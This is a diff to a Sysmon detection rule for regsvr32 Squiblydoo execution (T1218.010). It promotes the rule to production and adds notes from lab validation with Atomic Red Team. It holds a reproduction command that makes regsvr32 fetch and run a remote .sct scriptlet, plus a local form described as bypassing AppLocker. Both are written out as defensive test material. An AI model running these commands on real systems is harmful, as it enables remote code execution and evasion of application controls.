@@ -1,7 +1,7 @@
 ---
 id: win_sysmon_t1218.010_regsvr32_remote
 title: Regsvr32.exe with remote scriptlet (Squiblydoo)
-status: testing
+status: production
 author: LordMonstey
 created: 2026-04-28
 modified: 2026-04-28
@@ -67,6 +67,17 @@ Manual reproduction (replace URL with a controlled test endpoint):
 ```cmd
 regsvr32.exe /s /n /u /i:https://example.com/atomic-test.sct scrobj.dll
 ```
+
+
+**Validated**: 2026-04-30 via Atomic Red Team T1218.010-1 (Regsvr32 local COM scriptlet execution (Squiblydoo)) on lab host `win10-sysmon-client`.
+
+Squiblydoo bypass: `regsvr32 /s /u /i:<file.sct> scrobj.dll`. Loads a .sct scriptlet via the COM scripting engine, bypassing AppLocker DLL rules.
+
+**Evidence**: ![evidence](../tests/atomic/evidence/T1218.010-regsvr32-squiblydoo.png)
+
+**Test command**: `Invoke-AtomicTest T1218.010 -TestNumbers 1`
+
+**Cleanup**: `Invoke-AtomicTest T1218.010 -TestNumbers 1 -Cleanup`
 
 ## Response
 
